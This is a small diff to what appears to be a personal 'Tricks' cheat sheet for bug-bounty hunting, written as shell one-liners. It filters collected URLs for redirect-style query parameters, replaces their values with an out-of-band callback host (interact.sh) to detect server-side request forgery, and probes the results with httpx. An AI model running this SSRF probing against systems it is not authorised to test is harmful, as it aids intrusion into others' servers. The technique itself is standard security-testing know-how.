@@ -1,6 +1,6 @@
 
 #Tricks
-  ->cat allUrls.txt | grep "= | qsreplace https://ferhat.requestcatcher.com/ > ssrf.txt
+  ->cat allUrls.txt | grep -E "?url=|?uri=|?dest=|?redirect=|?path=|?continue=|?next=|?window=|?data=|?reference=|?site=|?html=|?val=|?validate=|?domain=|?callback=|?return=|?page=|?feed=|?host=|?port=|?view=|?dir=|?to=|?out=" | qsreplace interact.sh > ssrf.txt
   ->cat ssrf.txt | httpx -fr
   ->split -l 10 ssrf.txt çıktı_dosyası_prefix
 #
